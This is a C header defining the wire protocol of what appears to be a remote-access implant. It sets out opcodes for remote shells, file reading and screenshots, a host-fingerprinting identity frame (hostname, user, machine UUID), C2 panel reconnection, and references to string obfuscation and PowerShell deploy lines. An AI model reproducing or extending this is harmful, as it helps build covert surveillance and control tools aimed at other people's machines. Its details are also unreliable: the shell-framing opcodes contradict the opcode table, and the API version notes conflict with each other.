/* protocol.h - the relay protocol: opcodes, statuses, the identity frame.
 *
 * Pure constants and layout knowledge, no code. Every request the panel
 * sends is [1-byte opcode][payload]; every reply this agent sends is
 * [UINT32 LE status][payload]. The identity frame layout and the v4 shell
 * framing are documented inline - this header is the protocol reference.
 */

#pragma once

/* ==========================================================================
 * Command opcodes (the full table; incoming requests are decoded with it)
 * ======================================================================== */
#define CMD_OPEN_SHELL          0x01
#define CMD_WRITE_SHELL         0x02
#define CMD_READ_SHELL          0x03
#define CMD_CLOSE_SHELL         0x04

#define CMD_LIST_DIRECTORY      0x05
#define CMD_READ_FILE           0x06
#define CMD_HASH_FILE           0x07

#define CMD_GET_DISPLAYS        0x08
#define CMD_GET_SCREENSHOT      0x09
#define CMD_EXIT                0x0A

/* ==========================================================================
 * Reply status codes
 * ======================================================================== */

#define STATUS_OK               0
#define STATUS_ERROR            1

/* ==========================================================================
 * The identity frame - the reply to Hello (0x00), API v5
 *
 * Identification metadata first so the panel can detect the layout before
 * parsing anything variable-length. Fixed layout, ASCII strings NUL-padded
 * to their field width (field order per C2 docs/13-agent-implementation.md
 * §4.1; mirror of the v5 parser in C2 RelaySocket.cs ReadHelloV5):
 *
 *   offset  size  field
 *   ------  ----  -------------------------------------------------
 *   0       4     status = 0
 *   4       4     API version = 5 (selects this layout in the panel)
 *   8       4     agent name id (breed; 0 = PIA, 1 = this agent)
 *   12      9     commit hash (8 chars + NUL, display only)
 *   21      4     build number (display only)
 *   25      1     is-64-bit-process flag
 *   26      16    machine UUID, .NET Guid byte order (system_facts.c)
 *   42      256   hostname
 *   298     256   logged-on user name
 *   554     32    CPU architecture ("x64" / "x86")
 *   586     32    platform ("Windows")
 *   618     128   OS version ("10.0.19045")
 *   746     8     capability mask
 *   ------------------------------------------------------------------------
 *   total: 754 bytes
 *
 * v4 (750 bytes, UUID first, trailer "BuildNumber CommitHash ApiVersion
 * Is64Bit") is gone; the panel keeps its v4 fallback for older agents.
 * The shell wire format is unchanged in v5 - only this Hello reply moved.
 * ======================================================================== */

#define IDENTITY_FRAME_SIZE     754
#define ID_HOSTNAME_SIZE        256
#define ID_USERNAME_SIZE        256
#define ID_ARCH_SIZE            32
#define ID_PLATFORM_SIZE        32
#define ID_OS_VERSION_SIZE      128
#define ID_COMMIT_HASH_SIZE     9      /* 8 chars + NUL            */
#define ID_API_VERSION          5      /* v5 = metadata-first      */
#define ID_AGENT_NAME_ID        1      /* breed id: 0 = PIA, 1 = this agent
                                        * (register in C2 AgentBreeds) */

/* Display-only build tag. CI bakes the real one in with
 * -DID_BUILD_NUMBER=<git commit count>; local builds keep the default. */
#ifndef ID_BUILD_NUMBER
#define ID_BUILD_NUMBER         1      /* display-only build tag   */
#endif

/* ==========================================================================
 * Capability mask: 8 bytes, one bit per FEATURE CATEGORY, LSB first
 * (C2 docs/05-relay-protocol.md §5 "Capability mask"; the bit index is NOT
 * the opcode):
 *   bit 0 = Shell      (Open/Write/Read/CloseShell)  <- implemented here
 *   bit 1 = FileSystem (ListDirectory/ReadFile/HashFile)
 *   bit 2 = Display    (GetDisplays/GetScreenshot)
 * The mask travels as the X-Agent-Capabilities header (16 lowercase hex,
 * byte 0 first - stackstrings.h StrHdrCaps) and gates the panel's UI, not
 * the wire: the panel may still send any command, so unimplemented opcodes
 * are answered honestly with status 1. A Shell-only mask also routes the
 * panel's File Manager to its PowerShell-over-shell fallback (FsBackend).
 * ======================================================================== */

#define CAPABILITY_MASK         1      /* bit 0 = Shell */

/* API 1 (C2 docs/13-agent-implementation.md §4): identity = X-Agent-*
 * HTTP headers on the WebSocket upgrade. The C2 registers only
 * Api-Version 1 agents (RelaySocket.SupportedApiVersion); agents built
 * against the old binary Hello frame (API "v5") are invisible to it. */
#define AGENT_API_VERSION       1

/* Breed id in X-Agent-Name-Id (C2 AgentBreeds: 0=PIA, 1=JScript, 2=C#,
 * 3=PowerShell). This agent is its own codebase - an unregistered id,
 * which the panel displays as "Unknown (4)". */
#define AGENT_NAME_ID           4

/* ==========================================================================
 * Shell category specifics (v4 framing)
 *
 * The agent owns shell identity: each OpenShell allocates an id from a
 * 256-slot pool and returns it in the reply; the id then prefixes every
 * Write/Read/Close. Ids are indexes into the shell pool (shell.h).
 *
 *   OpenShell  request [0x0A]              reply [status:4][shellId:8]
 *   WriteShell request [0x04][shellId:8][UTF-8 input + NUL]  reply [status:4]
 *   ReadShell  request [0x05][shellId:8]   reply [status:4][UTF-8 chunk][NUL]
 *                                           (an empty chunk means "idle")
 *   CloseShell request [0x08][shellId:8]   reply [status:4]
 * Unknown or already-closed ids get status 1 on Write/Read.
 * ======================================================================== */

#define SHELL_POOL_SIZE         256
#define SHELL_READ_CHUNK        65536

/* ==========================================================================
 * Buffer and output limits
 * ======================================================================== */

/* One WinHttpWebSocketReceive call returns ONE fragment; 64 KB matches what
 * real agents use (a shorter buffer would fail on large fragments). */
#define RECV_FRAGMENT_SIZE      65536

/* Commands must fit here whole: the panel's PowerShell deploy lines reach
 * ~8 KB (8000 base64 chars + template), so 64 KB gives 8x headroom. A
 * message that exceeds even this is flagged truncated and refused rather
 * than half-executed. */
#define MAX_MESSAGE_SIZE        65536

/* Bytes of each message shown in the hex dump (keeps output readable). */
#define HEXDUMP_LIMIT           64

/* ==========================================================================
 * Agent process exit codes (why run_session / main ended)
 * ======================================================================== */

/* Exit command received - the only clean way the agent stops itself. */
#define RC_EXIT                 0

/* The connection was lost (transport error or a close frame) or closed
 * cleanly - main() redials after a capped backoff. Never a process exit. */
#define RC_SESSION_LOST         2

/* A local, unrecoverable failure (bad URL, no memory for handles): retrying
 * with the same arguments cannot help, so the process reports failure. */
#define RC_LOCAL_ERROR          1